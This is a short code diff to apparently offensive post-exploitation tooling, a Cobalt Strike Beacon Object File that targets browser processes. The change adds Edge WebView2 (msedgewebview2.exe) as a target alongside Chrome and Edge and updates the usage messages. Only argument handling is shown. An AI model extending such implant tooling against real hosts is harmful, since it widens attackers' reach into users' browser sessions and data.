@@ -52,7 +52,7 @@ extern "C" {
         BeaconDataParse(&parser, args, len);
         if (parser.original == 0)
         {
-            BeaconPrintf(CALLBACK_OUTPUT, "[-] Missing mandatory argument /chrome or /edge!\n");
+            BeaconPrintf(CALLBACK_OUTPUT, "[-] Missing mandatory argument /chrome, /edge or /webview!\n");
             return;
         }
 
@@ -67,9 +67,13 @@ extern "C" {
             BeaconPrintf(CALLBACK_OUTPUT, "[*] Targeting Edge\n");
             processName = L"msedge.exe";
         }
+        else if (_stricmp(targetConfig, "/webview") == 0) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] Targeting Msedgewebview2\n");
+            processName = L"msedgewebview2.exe";
+        }
         else
         {
-            BeaconPrintf(CALLBACK_OUTPUT, "[-] No target type specified! Use /edge or /chrome to specify target!\n");
+            BeaconPrintf(CALLBACK_OUTPUT, "[-] No target type specified! Use /edge, /chrome or /webview to specify target!\n");
             return;
         }
 
